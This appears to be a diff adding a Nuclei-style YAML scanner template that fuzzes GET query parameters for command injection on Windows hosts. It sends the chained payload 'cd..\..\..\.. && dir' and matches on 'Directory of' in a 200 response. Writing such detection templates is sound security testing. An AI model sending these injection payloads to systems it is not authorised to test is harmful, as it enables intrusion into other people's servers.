@@ -1,0 +1,39 @@
+id: fuzz-rce-cmd-injection
+
+info:
+  name: Command Injection RCE Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template tests for Remote Code Execution vulnerabilities 
+    through command injection using a directory traversal payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce_payload:
+        - "cd..\\..\\..\\.. && dir"  # Escape backslashes where needed
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Directory of"  # Part of the output for the 'dir' command
+
+      - type: status
+        status:
+          - 200  # HTTP status code indicating a successful response
